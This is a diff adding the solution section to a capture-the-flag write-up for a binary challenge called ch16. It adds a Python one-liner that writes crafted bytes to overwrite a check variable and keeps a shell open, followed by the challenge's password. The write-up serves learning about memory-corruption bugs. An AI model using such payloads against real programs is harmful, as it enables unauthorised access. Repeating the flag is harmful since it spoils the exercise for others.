@@ -96,3 +96,15 @@ gdb task >> break main >> run >> p &buffer >> p &check >> p (long)value - (long)
 
 The difference is -4 bytes, which means we need to take 4 steps back to get to this variable.
 
+# Solution
+
+(python3 -c "import sys; sys.stdout.buffer.write(b'\x08' * 4 + b'\xbc\xfa\xff\xbf')"; cat) | ./ch16
+
+We enter the same line, here ```b'\x08' * 4``` takes -4 steps back in the buffer and the next entry ```b'\xbc\xfa\xff\xbf'``` we write the value into this variable so that the conditions are met
+
+# Password
+
+**Password: Sm4shM3ify0uC4**
+
+![3 5](https://github.com/user-attachments/assets/1df1a7a7-bbf4-4152-956d-1c090142678e)
+
